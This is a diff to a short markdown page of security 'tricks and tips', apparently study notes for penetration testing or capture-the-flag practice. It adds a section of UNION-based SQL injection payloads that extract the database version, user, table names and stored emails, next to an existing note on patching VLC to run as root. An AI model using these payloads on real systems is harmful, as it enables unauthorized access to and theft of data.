@@ -6,6 +6,7 @@ title: Useful Tricks and Tips
 ```bash
 sed -i 's/geteuid/getppid/' /usr/bin/vlc
 ```
+
 - Base32 is a common transfer encoding. It consists of 32-char set. These char-sets are usually alphabet in uppercase. 
 - Base64 is another common transfer encoding. It consists of 64-char set. These char-sets are usually alphabet in uppercase and lowercase.
 - Hex consists of 16 bits of binary. It also known as base16
@@ -239,3 +240,16 @@ How to Mount it:
     df -k
 
 Now we can easily access the mount folder now.
+
+# SQL Injections
+
+```bash
+
+bob@livemail.com' UNION ALL SELECT concat_ws(0x3a, version(), user(), database())--
+
+
+bob@livemail.com' UNION ALL SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=database()--
+
+bob@livemail.com' UNION ALL SELECT email FROM table_name--
+
+```
